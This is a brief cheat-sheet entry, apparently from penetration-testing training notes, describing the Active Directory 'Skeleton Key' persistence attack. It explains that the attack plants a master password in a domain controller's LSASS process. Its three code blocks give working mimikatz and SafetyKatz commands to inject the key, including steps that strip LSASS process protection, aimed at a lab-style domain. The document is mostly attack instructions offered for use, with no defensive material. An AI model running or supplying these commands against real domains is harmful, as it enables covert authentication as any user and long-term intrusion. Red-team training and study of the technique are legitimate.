# Skeleton Key

Skeleton key is a persistence attack used to set a master password on one or multiple Domain Controllers. 

The master password can then be used to authenticate as any user in the domain while they can still authenticate with their original password. It makes detecting this attack a difficult task since it doesn't disturb day-to-day usage in the domain.

Skeleton key injects itself into the LSASS process of a Domain Controller to create the master password. It requires Domain Admin rights and SeDebugPrivilege on the target (which are given by default to domain admins).

This attack currently supports: NTLM and Kerberos (RC4 only) authentications

misc::skeleton injects a "Skeleton Key" into the LSASS process on the domain controller. A "master password" can then be used to authenticate as any domain user, while domain users can authenticate with their own password. The default skeleton key password is mimikatz.

```
mimikatz "privilege::debug" "misc::skeleton"
```

```
# Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice.  DA privileges required

SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```